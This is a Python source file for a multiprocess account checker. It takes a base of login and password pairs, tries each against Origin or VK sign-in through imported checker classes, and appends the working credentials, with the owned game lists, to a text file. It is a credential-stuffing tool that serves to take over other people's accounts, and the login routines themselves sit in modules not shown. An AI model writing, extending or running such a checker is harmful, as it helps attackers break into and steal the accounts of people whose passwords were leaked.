from VkCheck import VK_Checker
from OriginChecker import Origin_Checker, Answer
from termcolor import cprint
from multiprocessing import Pool, cpu_count
from math import ceil
import time


class MultiprocessChecker:
    def __init__(self, base, type_base):
        self.base = base
        self.type_base = type_base
        self.empty = True
        
    def multicheck(self):
        cores_count = cpu_count()
        logins = list(self.base.login_password)
        i = 0
        i_count = ceil(len(logins)/cores_count)
        for i in range(0, i_count):
            logins_check = logins[(cores_count * i):(cores_count * (i + 1))]
            self.start(logins_check)
            break  # удалить
        if (self.empty is True):
            return 1
        else:
            return 0

    def process(self, login):
        password = self.base.login_password.get(login)
        cprint("Check " + login, "magenta")
        if self.type_base == "Origin":
            checker = Origin_Checker(login, password, "Firefox")
            code = checker.auth_origin()
            if code == Answer.success:
                checker.get_games()
                self.empty = False
                with open("./base_check.txt", 'a') as file:
                    file.write(f"{login} {password} {checker.game_list}" + '\n')
        elif self.type_base == "VK":
            checker = VK_Checker(login, password, "Firefox")
            code = checker.auth_vk()
            if code == Answer.success:
                self.empty = False
                with open("./base_check.txt", 'a') as file:
                    file.write(f"{login} {password} {checker.game_list}" + '\n')

    def start(self, logins):
        with Pool() as pool:
            prosecc_1 = pool.map(self.process, logins)
            pool.close()
            pool.join()